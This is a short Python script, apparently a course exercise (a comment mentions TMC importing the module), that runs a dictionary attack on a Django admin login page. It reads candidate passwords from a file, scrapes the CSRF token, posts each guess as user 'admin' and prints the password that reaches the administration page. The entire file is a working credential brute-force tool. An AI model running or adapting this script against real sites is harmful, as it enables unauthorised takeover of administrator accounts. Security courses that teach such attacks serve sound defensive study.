import sys
import requests
import bs4 as bs

def extract_token(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	for i in soup.form.findChildren('input'):
		if i.get('name') == 'csrfmiddlewaretoken':
			return i.get('value')
	return None
	

def isloggedin(response):
	soup = bs.BeautifulSoup(response.text, 'html.parser')
	return soup.title.text.startswith('Site administration')


def test_password(address, candidates):
	s = requests.Session()
	r = s.get(address + '/admin/login/?next=/admin/')
	token = extract_token(r)
	for pw in candidates:
		login_data = dict(username='admin', password=pw, csrfmiddlewaretoken=token)
		r = s.post(address + '/admin/login/?next=/admin/', data=login_data, headers=dict(Referer=address + '/admin/login/?next=/admin/'))
		if (isloggedin(r)):
			return pw
	return r



def main(argv):
	address = sys.argv[1]
	fname = sys.argv[2]
	candidates = [p.strip() for p in open(fname)]
	print(test_password(address, candidates))


# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 3:
		print('usage: python %s address filename' % sys.argv[0])
	else:
		main(sys.argv)
